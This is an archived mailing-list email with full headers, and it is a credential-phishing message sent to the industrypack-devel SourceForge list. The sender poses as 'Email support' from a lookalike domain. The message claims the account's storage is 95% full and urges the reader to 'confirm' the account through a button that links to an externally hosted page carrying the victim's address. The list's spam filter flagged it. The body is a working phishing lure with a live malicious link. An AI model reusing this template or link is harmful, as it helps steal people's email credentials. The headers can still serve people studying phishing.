Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 28C965F2854
	for <lists+industrypack-devel@lfdr.de>; Mon,  3 Oct 2022 08:02:52 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1ofEXS-0002aM-6W
	for lists+industrypack-devel@lfdr.de;
	Mon, 03 Oct 2022 06:02:50 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@qermanmedtech.com>) id 1ofEXR-0002a4-8d
 for industrypack-devel@lists.sourceforge.net;
 Mon, 03 Oct 2022 06:02:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:From:To:Subject:MIME-Version:Content-Type:
 Sender:Reply-To:Message-ID:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=8cmccvhz1d76oz++IgGPRqi7+zu7ICXoso0PgeKZoFo=; b=nFfxlWZEnllSeEJINXGwwOhMFe
 wqjgRNzbwABbtoSEfBvLYDf5qDCtWfK3eW4s5pC7fVEd4Z7w7pV102ZxQHq/n1oGubaP+mYnq3Jj6
 YisQm8SIiNuUnZ3aLyfGIT55vqe555DJi0WBGVlIbMCphh3gOJrvJElzmnfRWis24498=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:From:To:Subject:MIME-Version:Content-Type:Sender:Reply-To:Message-ID
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=8cmccvhz1d76oz++IgGPRqi7+zu7ICXoso0PgeKZoFo=; b=A
 AH+l6xzqSFo53Cdg3qLqrkC3xHP0CKtnNnkoa1wZnLkDYT8NBNguGXnEL7dPoZlPR0W4+ldfPukzL
 T9wwSN7X7kXzapflyER9vTgC910Rr1WuPOBkC4/REJ+ehK8yiZPzYvTIOo1n9OdWmhqpoB0KebD4W
 HJ1WvUoTTkbFVcEo=;
Received: from mta0.qermanmedtech.com ([192.119.73.199])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1ofEXQ-00AdDW-LJ for industrypack-devel@lists.sourceforge.net;
 Mon, 03 Oct 2022 06:02:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=qermanmedtech.com; 
 h=Content-Type:MIME-Version:Subject:To:From:Date; i=noreply@qermanmedtech.com; 
 bh=8cmccvhz1d76oz++IgGPRqi7+zu7ICXoso0PgeKZoFo=;
 b=mwy5eYOs26pKaIqkNpF2ziEykAQ2Q6+RTOhhNRoE9wPq9XrwFbMBC60pnTjNcG5dnNAHPsLVPqFD
 1crJ96Muxag5xM1xT+PBm2xXags51+bqEnBthji3FC0b+hZofdrhgSQOnslW8LBFFUFd4fgzMggC
 ktucRMWvXjzlYx4EWWM=
MIME-Version: 1.0
To: industrypack-devel@lists.sourceforge.net
Date: Sun, 02 Oct 2022 22:49:20 -0700
X-Spam-Score: 7.1 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Email support Hello industrypack-devel@lists.sourceforge.net
 Your email server storage is 95% full. Free up some space for incoming
 messages
 by confirming your account industrypack-devel@lists.sourceforge.net 
 Content analysis details:   (7.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [192.119.73.199 listed in dnsbl-1.uceprotect.net]
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 2.7 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.1 MISSING_MID            Missing Message-Id: header
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1ofEXQ-00AdDW-LJ
Subject: [Industrypack-devel] Email Delivery Failed
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Email Support via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Email Support <noreply@qermanmedtech.com>
Content-Type: multipart/mixed; boundary="===============2397968657076762181=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
Message-Id: <E1ofEXS-0002aM-6W@sfs-ml-1.v29.lw.sourceforge.com>

You will not see this in a MIME-aware mail reader.
--===============2397968657076762181==
Content-Type: multipart/alternative; boundary="===============0877489170=="

You will not see this in a MIME-aware mail reader.
--===============0877489170==
Content-Type: text/plain; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

 =

    =

   =



	 Email support

  	 =

 =

   =

   =

    Hello industrypack-devel@lists.sourceforge.net
 Your email server storage is 95% full.
 Free up some space for incoming messages by confirming your account indust=
rypack-devel@lists.sourceforge.net

  Confirm
   =

   =

 Email support =A9 2022. All rights reserved
  =




--===============0877489170==
Content-Type: text/html; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

<HTML><BODY><P>
<TABLE style=3D'FONT-SIZE: 11px; MAX-WIDTH: 620px; FONT-FAMILY: "Lucida Gra=
nde", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPAC=
ING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(51,51,51); FONT-STYLE: normal; BORDER-SPACING: 0px; ORPHANS: 2=
; WIDOWS: 2; MARGIN: 5px auto; LETTER-SPACING: normal; BACKGROUND-COLOR: rg=
b(255,255,255); font-variant-ligatures: normal; font-variant-caps: normal; =
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial' cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%" align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; BORDER-COLLAPSE: collapse; MARGIN: 0px">
<TABLE style=3D"BORDER-TOP: rgb(204,204,204) 1px solid; BORDER-RIGHT: rgb(2=
04,204,204) 1px solid; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(204,20=
4,204) 1px solid; BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px so=
lid; BACKGROUND-COLOR: rgb(228,228,228)" cellSpacing=3D0 cellPadding=3D0 wi=
dth=3D"100%" border=3D0>
<TBODY>
<TR height=3D32>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; BORDER-COLLAPSE: collapse; PADDING-LEFT: 15px; MARGIN: 0px; PADDING-RIGHT=
: 15px" vAlign=3Dmiddle width=3D32 align=3Dleft><BR><BR><BR></TD>
<TD style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Symantec Sans"; BORDER-COLLAPSE=
: collapse; MARGIN: 0px' vAlign=3Dmiddle align=3Dleft><FONT style=3D"VERTIC=
AL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><SPAN class=3Dv1=
il>Email support</SPAN></FONT></FONT><BR></TD></TR>
<TR style=3D"PADDING-LEFT: 15px" height=3D3>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; BORDER-COLLAPSE: collapse; MARGIN: 0px"></TD>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; BORDER-COLLAPSE: collapse; MARGIN: 0px"></TD></TR></TBODY></TABLE>
<TABLE style=3D"BORDER-TOP: rgb(204,204,204) 1px solid; BORDER-RIGHT: rgb(2=
04,204,204) 1px solid; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(204,20=
4,204) 1px solid; BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px so=
lid; BACKGROUND-COLOR: rgb(255,255,255)" cellSpacing=3D0 cellPadding=3D0 wi=
dth=3D"100%" bgColor=3D#ffffff border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri; BORDER-COLLAPSE: collap=
se; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 15px; MARGIN: 0px;=
 LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(236,243,249)=
"><B><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN:=
 inherit"></FONT></FONT></B></TD></TR>
<TR>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri; BORDER-COLLAPSE: collap=
se; PADDING-BOTTOM: 5px; PADDING-TOP: 0px; PADDING-LEFT: 15px; MARGIN: 0px;=
 LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(236,243,249)=
">
<TABLE style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
<TBODY>
<TR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Open Sans", HelveticaNeue-Light=
, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grand=
e", sans-serif; COLOR: rgb(64,64,64); LINE-HEIGHT: 26px'>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MARGIN: 0px">
<P><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: i=
nherit">Hello industrypack-devel@lists.sourceforge.net</FONT></FONT></P>
<P><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: i=
nherit">Your email server storage&nbsp;is&nbsp;95% full.</FONT></FONT></P>
<P><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: i=
nherit">Free up some space for incoming&nbsp;messages by confirming your ac=
count industrypack-devel@lists.sourceforge.net</FONT></FONT></P></TD></TR><=
/TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDI=
NG-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px" width=3D300 align=3Dleft><=
A style=3D'FONT-SIZE: 15px; MAX-WIDTH: 210px; FONT-FAMILY: "Open Sans", "He=
lvetica Neue", Arial; WIDTH: 210px; COLOR: white; PADDING-BOTTOM: 14px; TEX=
T-ALIGN: center; PADDING-TOP: 14px; PADDING-LEFT: 7px; MARGIN: 0px; DISPLAY=
: block; PADDING-RIGHT: 7px; BACKGROUND-COLOR: darkblue; border-radius: 4px=
; text-decoration-line: none' href=3D"https://storageapi.fleek.co/509e8260-=
e3cb-4cdd-bdea-1dbfe439e184-bucket/frc-18963bc27412.html#industrypack-devel=
@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank><FONT style=3D"VER=
TICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Confirm</FONT=
></FONT></A></TD></TR>
<TR>
<TD style=3D"FONT-SIZE: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 5px; PADDING-T=
OP: 5px; PADDING-LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 15=
px">&nbsp;</TD></TR>
<TR style=3D"MARGIN-TOP: 10px; BACKGROUND-COLOR: rgb(228,228,228)">
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri; BORDER-COLLAPSE: collap=
se; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 15px; MARGIN: 0p=
x; LINE-HEIGHT: 20px; PADDING-RIGHT: 15px">
<P></P>
<P><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: i=
nherit">Email support =A9 2022. All rights reserved</FONT></FONT></P>
<P>&nbsp;</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P></BODY=
></HTML>
--===============0877489170==--


--===============2397968657076762181==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2397968657076762181==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2397968657076762181==--

